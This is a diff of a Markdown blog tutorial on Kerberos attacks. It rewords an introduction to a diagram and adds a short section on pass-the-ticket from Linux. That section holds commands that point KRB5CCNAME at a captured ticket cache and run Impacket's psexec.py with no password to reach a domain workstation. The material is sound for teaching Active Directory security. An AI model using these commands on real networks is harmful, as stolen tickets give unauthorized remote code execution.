@@ -70,7 +70,7 @@ Now I could ramble on now about the complete process of Requesting a **TGT**, **
 
 **https://www.roguelynn.com/words/explain-like-im-5-kerberos/**
 
-**I also want to leave this Diagram here as it's the clearest high level overview picture I could find out there.**
+**I was planning on explaining here the Kerberos Process from requesting a TGT & TGS Ticket at a high level and then I found this pic, so I will let it do the talking.**
 
 ![a simple Kerberos authentication diagram](https://www.varonis.com/blog/wp-content/uploads/2018/07/Kerberos-Graphics-1-v2-787x790.jpg)
 
@@ -1333,3 +1333,20 @@ Now if we `PTT` of a `TGT` into our current session we will therefore be able to
 
 ### [](#header-3)From Linux
 
+
+
+Passing-The-Ticket in Linux is a little but different in the sense that you have to pull the tickets in `.ccache` form and then typically use them alongside a **Impacket** script such as PSExec. 
+
+Truthfully I haven't played with PTT on Linux besides a Simple PSExec but I'm sure there is way more to play with. 
+
+An example would be.
+
+```python
+m0chan@kali:/scripts/> export KRB5CCNAME=/root/impacket-examples/krb5cc_08009234234_ZFxIpl 
+
+m0chan@kali:/scripts/> python psexec.py m0chanAD.local/user@workstation.m0chanAD.local -k -no-pass
+```
+
+
+
+ 
